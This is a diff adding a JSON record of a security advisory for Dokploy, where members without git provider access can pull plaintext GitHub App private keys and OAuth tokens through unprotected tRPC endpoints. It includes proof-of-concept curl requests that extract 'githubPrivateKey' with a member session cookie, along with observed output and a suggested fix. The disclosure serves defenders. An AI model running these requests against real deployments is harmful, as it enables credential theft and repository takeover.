@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-wx75-vxph-2m2f",
+  "repo": {
+    "cve_id": "CVE-2026-86059",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-200",
+      "CWE-862"
+    ],
+    "description": "### Summary\r\n\r\nAn authenticated organization **member** without git-provider access can retrieve plaintext git credentials (GitHub App private keys, OAuth tokens, app passwords, webhook secrets) through tRPC endpoints that skip `getAccessibleGitProviderIds()` checks. Affected routes include `github.one`, `gitlab.one`, `gitea.one`, `bitbucket.one`, and nested git relations returned by `application.one` even when `hasGitProviderAccess` is `false`.\r\n\r\nThis is **not** fixed by PR #4569 ([#4441](https://github.com/Dokploy/dokploy/issues/4441)), which only redacted secrets from `gitProvider.getAll`. **Verified on `dokploy/dokploy:v0.29.8`** (official Docker Swarm install).\r\n\r\n### Details\r\n\r\nDokploy stores git provider secrets in PostgreSQL. Access is intended to be limited by `getAccessibleGitProviderIds()` in `packages/server/src/services/git-provider.ts`: owners/admins see all org providers; members only see providers they own, providers marked `sharedWithOrganization`, or providers in their enterprise `accessedGitProviders` list.\r\n\r\nList endpoints (`github.githubProviders`, `gitProvider.getAll` after #4569) apply this model and omit secrets. Per-provider `.one` routes do **not**.\r\n\r\n#### Vector 1 - direct `.one` IDOR\r\n\r\n`apps/dokploy/server/api/routers/github.ts`:\r\n\r\n```ts\r\none: protectedProcedure.input(apiFindOneGithub).query(async ({ input }) => {\r\n  return await findGithubById(input.githubId);\r\n}),\r\n```\r\n\r\n`findGithubById()` (`packages/server/src/services/github.ts`) returns the full row, including `githubPrivateKey`, `githubClientSecret`, `githubWebhookSecret`, and `githubInstallationId`. There is no call to `getAccessibleGitProviderIds()` and no `organizationId` check.\r\n\r\nThe same pattern exists in `gitlab.ts`, `gitea.ts`, and `bitbucket.ts` for `one`, `get*Repositories`, `get*Branches`, and `testConnection`.\r\n\r\n#### Vector 2 - `application.one` nested leak\r\n\r\n`apps/dokploy/server/api/routers/application.ts` sets `hasGitProviderAccess: false` when `canEditDeployGitSource()` fails, but still returns the full application object from `findApplicationById()`.\r\n\r\n`packages/server/src/services/application.ts` loads git relations with `github: true`, `gitlab: true`, etc., while registry passwords are explicitly excluded:\r\n\r\n```ts\r\nregistry: { columns: { password: false } },\r\n```\r\n\r\nGit provider secret columns are not redacted. The `hasGitProviderAccess` flag is informational only.\r\n\r\n#### Relationship to #4441\r\n\r\nIssue #4441 reported credential leakage via `gitProvider.getAll`. PR #4569 (merged 2026-06-07) strips secrets from that endpoint. The `.one` routers and `application.one` nested relations were **not** updated and remain exploitable in v0.29.8.\r\n\r\n#### Affected versions\r\n\r\nConfirmed: **v0.29.8**. Likely affects all versions where per-provider `.one` handlers return full DB rows without access checks (predates and postdates the #4569 fix).\r\n\r\n### PoC\r\n\r\n**Environment:** Official install (`curl -sSL https://dokploy.com/install.sh | sudo bash`) with `DOKPLOY_VERSION=v0.29.8`.\r\n\r\n1. Register owner at `http://HOST:3000` and create organization.\r\n2. Owner connects a GitHub provider with `sharedWithOrganization=false` (or seed equivalent rows in DB).\r\n3. Create an application linked to that provider.\r\n4. Invite/register a **member** with read access to the application but **no** git-provider access (`accessedGitProviders=[]`).\r\n5. Sign in as member and capture `better-auth.session_token`.\r\n\r\n**Attack A - `github.one`:**\r\n\r\n```bash\r\ncurl -s 'http://HOST:3000/api/trpc/github.one?input={\"json\":{\"githubId\":\"GITHUB_ID\"}}' \\\r\n  -H 'Origin: http://HOST:3000' \\\r\n  -H 'Cookie: better-auth.session_token=MEMBER_SESSION' \\\r\n  | jq '.result.data.json.githubPrivateKey'\r\n```\r\n\r\n**Expected:** HTTP 200 with full PEM private key and `githubClientSecret`.\r\n\r\n**Attack B - `application.one`:**\r\n\r\n```bash\r\ncurl -s 'http://HOST:3000/api/trpc/application.one?input={\"json\":{\"applicationId\":\"APP_ID\"}}' \\\r\n  -H 'Origin: http://HOST:3000' \\\r\n  -H 'Cookie: better-auth.session_token=MEMBER_SESSION' \\\r\n  | jq '{hasGitProviderAccess: .result.data.json.hasGitProviderAccess, key: .result.data.json.github.githubPrivateKey}'\r\n```\r\n\r\n**Expected:** `hasGitProviderAccess: false` and `github.githubPrivateKey` still present.\r\n\r\n**Control:** `github.githubProviders` does **not** list the private provider for the member.\r\n\r\n**Observed on v0.29.8 production install:**\r\n\r\n```\r\nAttack A: HTTP 200 | githubPrivateKey leaked\r\nAttack B: HTTP 200 | hasGitProviderAccess=false, nested key leaked\r\nControl: private provider absent from githubProviders list\r\n```\r\n\r\n**Automated PoC:** `targets/dokploy/poc/DK-001-production-poc.mjs`\r\n\r\n### Impact\r\n\r\n**Type:** CWE-862 (Missing Authorization), CWE-200 (Exposure of Sensitive Information).\r\n\r\n**Who is impacted:** Any Dokploy deployment with multiple users per organization where git providers are not shared with all members (typical team setups).\r\n\r\n**Consequences:**\r\n\r\n- Exfiltration of GitHub App private keys → installation tokens, private repo read/write, workflow manipulation\r\n- Exfiltration of GitLab/Gitea OAuth tokens and Bitbucket app passwords\r\n- Bypass of per-member git-provider assignment (enterprise feature)\r\n- On multi-tenant hosts, potential cross-organization impact if provider IDs are obtained (nanoid IDs reduce but do not eliminate risk)\r\n\r\n**Severity:** High. Any authenticated member with application read access (or knowledge of a provider ID) can escalate to full git-provider credentials without admin privileges.\r\n\r\n### Suggested fix\r\n\r\n1. Add `assertGitProviderAccess(session, gitProviderId)` to all git provider `.one` / repository / branch routes.\r\n2. Redact secret columns from nested git relations in `findApplicationById()` or `application.one` (mirror existing `registry: { columns: { password: false } }` pattern).\r\n3. Add integration tests: member without provider access must receive 403 on `.one` and redacted data on `application.one`.",
+    "ghsa_id": "GHSA-wx75-vxph-2m2f",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-wx75-vxph-2m2f",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wx75-vxph-2m2f"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-86059"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:05Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Git Provider Credential Exposure via Unprotected .one Endpoints and application.one",
+    "updated_at": "2026-09-04T21:04:01Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "docker",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
